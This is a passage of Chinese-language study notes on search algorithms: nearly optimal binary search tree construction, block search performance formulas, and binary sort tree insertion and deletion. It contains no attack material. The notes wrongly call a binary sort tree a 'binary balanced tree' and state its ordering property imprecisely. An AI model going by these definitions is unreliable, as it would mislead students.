mathvariant="normal">Δ</mi><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\Delta{P_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord">Δ</span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span>,例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi><msub><mi>P</mi><mi>j</mi></msub><mo>=</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>s</mi><msub><mi>w</mi><mi>h</mi></msub><mo>−</mo><mi>s</mi><msub><mi>w</mi><mi>j</mi></msub><mi mathvariant="normal">∣</mi><mo>−</mo><mi mathvariant="normal">∣</mi><mi>s</mi><msub><mi>w</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><mi>s</mi><msub><mi>w</mi><mi>l</mi></msub><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">\Delta{P_j}=||sw_h-sw_j|-|sw_{j-1}-sw_l||</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord">Δ</span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">∣</span></span></span></span></p><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>关键字</strong></td><td></td><td><strong>A</strong></td><td><strong>B</strong></td><td><strong>C</strong></td><td><strong>D</strong></td><td><strong>E</strong></td><td><strong>F</strong></td><td><strong>G</strong></td><td><strong>H</strong></td><td><strong>I</strong></td></tr><tr><td><strong>权值</strong></td><td>0</td><td>1</td><td>1</td><td>2</td><td>5</td><td>3</td><td>4</td><td>4</td><td>3</td><td>5</td></tr><tr><td><strong>j</strong></td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td></tr><tr><td><strong>swj</strong></td><td>0</td><td><code>1</code></td><td><code>2</code></td><td><code>4</code></td><td><code>9</code></td><td><code>12</code></td><td><code>16</code></td><td><code>20</code></td><td><code>23</code></td><td><code>28</code></td></tr><tr><td><strong>△Pj</strong></td><td></td><td>27</td><td>25</td><td>22</td><td>15</td><td>7</td><td><code>0</code></td><td>8</td><td>15</td><td>23</td></tr><tr><td>（<strong>根</strong>）</td><td></td><td></td><td></td><td></td><td></td><td></td><td><code>↑i</code></td><td></td><td></td><td></td></tr><tr><td><strong>△Pj</strong></td><td></td><td>11</td><td>9</td><td>6</td><td><code>1</code></td><td>9</td><td></td><td>8</td><td><code>1</code></td><td>7</td></tr><tr><td>（<strong>根</strong>）</td><td></td><td></td><td></td><td></td><td><code>↑i</code></td><td></td><td></td><td></td><td><code>↑i</code></td><td></td></tr><tr><td><strong>△Pj</strong></td><td></td><td>3</td><td><code>1</code></td><td>2</td><td></td><td><code>0</code></td><td></td><td><code>0</code></td><td></td><td><code>0</code></td></tr><tr><td>（<strong>根</strong>）</td><td></td><td></td><td><code>↑i</code></td><td></td><td></td><td><code>↑i</code></td><td></td><td><code>↑i</code></td><td></td><td><code>↑i</code></td></tr><tr><td><strong>△Pj</strong></td><td></td><td><code>0</code></td><td></td><td><code>0</code></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>（根）</strong></td><td></td><td><code>↑i</code></td><td></td><td><code>↑i</code></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>构造好的次优二叉树如图</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530161655781.png" class="" alt="image-20240530161655781" loading="lazy"></li><li><p>代码实现:<a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Search/secondOptimal.cpp">DataStructuresAndAlgorithms/C/Search/secondOptimal.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul></li></ul><h4 id="索引顺序表的查找"><a class="markdownIt-Anchor" href="#索引顺序表的查找"></a> 索引顺序表的查找</h4><ul><li><p>也叫分块查找,是顺序查找的一种改进方法,实现除了需要查找表本身之外，还需要根据查找表建立一个索引表</p></li><li><p>条件:<mark>索引表按关键字有序</mark>，<mark>查找表或者有序 或者分块有序</mark>，分块有序指的是第二个子表中所有记录的关键字均大于第一个子表中的最大关键字.。<mark>设n个记录分为b个块</mark></p></li><li><p>基本思想：分两步进行</p><ol><li>确定要查找的关键字可能存在的子表</li><li>在具体的子表中进行顺序查找</li></ol><blockquote><p>在第一步确定块（子表）时，由于索引表中按照关键字有序，所有可以采用折半查找算法。而在第二步中，由于各子表中关键字没有严格要求有序，所以只能采用顺序查找的方式。因此此种算法可以是介于折半和顺序的，是两种算法的简单合成</p></blockquote></li><li><p>性能分析:</p><ul><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mrow><mi>b</mi><mi>s</mi></mrow></msub><mo>=</mo><msub><mi>L</mi><mi>b</mi></msub><mo>+</mo><msub><mi>L</mi><mi>w</mi></msub></mrow><annotation encoding="application/x-tex">ASL_{bs}=L_b+L_w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,Lb为查找索引表确定，所在块的平均查找长度,Lw为所在块中查找元素的平均查找长度</p></li><li><p>一般情况下长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>的表，被均匀分为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>块，每块含有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span></span></span></span>个记录,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><mo stretchy="false">⌈</mo><mfrac><mi>n</mi><mi>s</mi></mfrac><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">b=\lceil \frac{n}{s} \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌉</span></span></span></span></p><ol><li><p>若用顺序查找确定所在块</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mrow><mi>b</mi><mi>s</mi></mrow></msub><mo>=</mo><msub><mi>L</mi><mi>b</mi></msub><mo>+</mo><msub><mi>L</mi><mi>w</mi></msub><mo>=</mo><mfrac><mrow><mi>b</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo>+</mo><mfrac><mrow><mi>s</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><mfrac><mi>n</mi><mi>s</mi></mfrac><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ASL_{bs}=L_b+L_w=\frac{b+1}{2}+\frac{s+1}{2}=\frac{1}{2}(\frac{n}{s}+s)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.05744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">s</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p><p>最佳分块:显然是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>=</mo><msqrt><mi>n</mi></msqrt></mrow><annotation encoding="application/x-tex">s=\sqrt{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.23972em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8002800000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal">n</span></span></span><span style="top:-2.76028em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23972em;"><span></span></span></span></span></span></span></span></span></p></li><li><p>若用折半查找确定所在块</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mrow><mi>b</mi><mi>s</mi></mrow></msub><mo>≈</mo><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mfrac><mi>n</mi><mi>s</mi></mfrac><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mfrac><mi>s</mi><mn>2</mn></mfrac></mrow></mrow><annotation encoding="application/x-tex">ASL_{bs}\approx{log_2(\frac{n}{s}+1)+\frac{s}{2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">s</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span></p></li></ol></li></ul></li><li><p>代码实现 <a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Search/blockSearch.cpp">DataStructuresAndAlgorithms/C/Search/blockSearch.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul><h3 id="动态查找表"><a class="markdownIt-Anchor" href="#动态查找表"></a> 动态查找表</h3><h4 id="二叉排序树"><a class="markdownIt-Anchor" href="#二叉排序树"></a> 二叉排序树</h4><ul><li><p>概念:二叉排序树又称二叉平衡树(binary sort tree)。二叉排序树或者是一棵空树，或者是具有以下<mark>性质</mark>的二叉树:</p><ul><li>若它的左子树不空，则左子树上的所有结点的值均小于它的右子树节点</li><li>若它的右子树不空，则右子树上的所有结点的值均大于它的左子树节点</li><li>它的左右子树也分别为二叉排序树</li></ul></li><li><p>查找</p><ul><li>查找过程和次优二叉树类似</li><li>首先和根节点比较，相等则成功，大于则在右子树继续查找，小于则在左子树继续查找</li></ul></li><li><p>插入</p><ul><li>二叉排序树是一种动态树表，与次优二叉树相对。特点在与树的结构通常不是一次生成的，而是在查找过程中，当树中不存在关键字等于给定值的结点时再进行插入</li><li>如果当前节点为空，则创建新节点</li><li>如果插入的值小于当前节点的值，递归插入到左子树</li><li>如果插入的值大于当前节点的值，递归插入到右子树</li><li><mark>简而言之就是在查找不成功的时候，返回插入位置，在该位置插入</mark></li></ul></li><li><p><mark>删除</mark></p><p>假设在二叉排序树上被删结点为*p,其双亲节点为*f,且不失一般性，设*p是*f的左孩子</p><p>PL表示其左子树，PR表示其右子树</p><p>删除有以下三种情况</p><ul><li><p>若*p节点为叶子节点，即PL与PR均为空树。则只需要设置双亲节点的的孩子指针为NULL</p></li><li><p>若*p节点只有左子树PL或者只有右子树PR。则只令PL或者PR成为双亲节点的子树即可</p></li><li><p>若*p节点的左子树和右子树均不空。中序遍历二叉排序树得到的有序序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo 